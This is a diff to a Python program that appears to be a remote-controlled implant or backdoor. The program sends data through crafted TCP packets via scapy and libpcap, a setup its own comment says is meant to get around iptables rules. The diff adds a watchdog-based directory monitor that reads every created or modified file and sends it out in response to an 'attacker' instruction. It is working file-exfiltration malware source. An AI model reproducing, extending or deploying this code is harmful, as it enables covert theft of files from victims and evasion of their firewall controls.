@@ -26,6 +26,12 @@ import encryption
 import utils
 import textwrap
 import subprocess
+# watchdog imports
+import sys
+import time
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
+# scapy imports
 from scapy.all import *
 from scapy.layers.inet import *
 # Set scapy to use libpcap library to circumvent iptables rules.
@@ -380,6 +386,88 @@ def send_message(message, instruction, filename=""):
                 current_seq = syn_ack[TCP].ack + int(len(payload) * idx)
             else:
                 current_seq = r_ack[TCP].ack
+
+
+class OnMyWatch:
+    def __init__(self, directory_path, is_recursive=True):
+        self.observer = Observer()
+        # Set the directory on watch
+        self.watch_directory = directory_path
+        self.is_recursive = is_recursive
+
+    def run(self):
+        event_handler = Handler()
+        self.observer.schedule(event_handler, self.watch_directory, recursive=self.is_recursive)
+        self.observer.start()
+        try:
+            while True:
+                time.sleep(5)
+        except:
+            self.observer.stop()
+            print("Observer Stopped")
+
+        # self.observer.join()
+
+    def stop(self):
+        self.observer.stop()
+
+
+class Handler(FileSystemEventHandler):
+
+    @staticmethod
+    def on_any_event(event):
+        if event.is_directory:
+            return None
+
+        elif event.event_type == 'created':
+            # Event is created, you can process it now
+            print("Watchdog received created event - % s." % event.src_path)
+            print(event.src_path)
+            binary_file, file_name = get_file_binary(event.src_path)
+            send_message(binary_file, "7", file_name)
+            # "7" to match the watch a directory instruction sent by attacker
+        elif event.event_type == 'modified':
+            # Event is modified, you can process it now
+            print("Watchdog received modified event - % s." % event.src_path)
+            print(event.src_path)
+            binary_file, file_name = get_file_binary(event.src_path)
+            send_message(binary_file, "7", file_name)
+            # "7" to match the watch a directory instruction sent by attacker
+
+
+directory_watch_active = False
+directory_path = "data"
+watch = OnMyWatch(directory_path)
+
+
+def start_watching_directory(new_directory_path):
+    global watch
+    global directory_watch_active
+    global directory_path
+    if directory_watch_active:
+        print(f"Already watching directory {directory_path}")
+        return
+
+    directory_watch_active = True
+    directory_path = new_directory_path
+    watch = OnMyWatch(directory_path)
+
+    watch.run()
+    print(f"Directory watch started: {directory_path}")
+
+
+def stop_watching_directory():
+    global watch
+    global directory_watch_active
+
+    if not directory_watch_active:
+        print("Directory watch stopped.")
+        return
+
+    watch.stop()
+    directory_watch_active = False
+    print(f"Directory watch stopped: {directory_path}")
+    return
 
 
 if __name__ == "__main__":
